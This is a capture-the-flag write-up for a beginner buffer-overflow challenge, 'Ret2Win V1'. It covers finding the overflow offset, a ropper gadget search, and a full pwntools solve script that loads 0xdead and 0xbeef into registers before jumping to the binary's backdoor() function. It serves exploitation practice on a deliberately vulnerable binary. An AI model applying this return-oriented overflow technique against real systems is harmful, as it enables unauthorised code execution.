## Ret2Win V1

Description: Baby pwn, enjoy!<br>
Author: h4ckyou<br>
Solves: 4

# Ret2Win V1

*Solved by: Logs*

This is a buffer overflow to the win(backdoor) function with key ckecks
Decompiling the binary

The challenge() function
 
![image](https://github.com/user-attachments/assets/c5a2af60-c0c2-484e-bcd5-2b16776c0140)

The first part asks us a question “Would You like to give any feeback” and our input local_d goes through a string compare, which compares it to the string “yes”. We give “yes” as the first input and the the feedback() function is called.


feedback()
 
![image](https://github.com/user-attachments/assets/908a6014-f9ad-4428-8d5e-f07e94fd1251)


The feedback function ask for another input using the read function which accepts a total of 96 bytes
0x60 = 96. 
And the function we are trying to get into, the backdoor() function

backdoor()

 ![image](https://github.com/user-attachments/assets/57031cf2-fff6-43bb-8974-6d0ecddd8780)


From here on I just attempted to try a buffer overflow, first finding the offset to the $rsp register. 
I load binary up in gdb-gef, the generate an string length of 100 with “pattern create 100”. 
Next I use ran the program, and gave it the first input “yes”, then the second input will be the pattern of 100 strings create. Which then overflowed the buffer. 

 ![image](https://github.com/user-attachments/assets/379321c0-b674-4f1e-8c34-551bff0a98a5)


With this I was able to get the offset for the overflow.


I also noticed a function in the binary called helper() Which looked like this. 
 
![image](https://github.com/user-attachments/assets/c86427ff-6529-41a9-a641-4b1c769226ca)

This will be helpful I crafting out solve script because, after overwriting the return address to the backdoor, the backdoor will also perform a check on two parameters, with values
```0xdead``` and ```0xbeef``` respectfully

Using ropper on the binary
```
ropper -f ret2win1 --search='pop rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ret2win1
0x0000000000401358: pop rdi; pop rsi; ret; 
0x00000000004014e3: pop rdi; ret;
```

So we have to load the values ```0xdead``` and ```0xbeef``` into ```0x0000000000401358: pop rdi; pop rsi; ret;```


Have all that now we write our solve script. 
```python
python
from pwn import *
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg

continue
'''.format(**locals())

# Binary filename
exe = './ret2win1'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

offset = 56
io.sendline('yes')
# pop_rdi = p64(0x4014e3)  # Address of 'pop rdi; ret'
# pop_rsi_r15 = p64(0x4014e1)  # Address of 'pop rsi; pop r15; ret'

pop_rdi_rsi = p64(0x401358)

param_1 = 0xdead # First parameter
param_2 = 0xbeef  # Second parameter

payload = flat({
    offset: [
        pop_rdi_rsi,  # Pop the next value to RDI
        param_1,  # Pop the next value to RSI (and junk into R15)
        param_2,
        p64(elf.sym['backdoor'])
    ]
})

io.sendline(payload)
io.interactive()
```
Running the script we got the flag

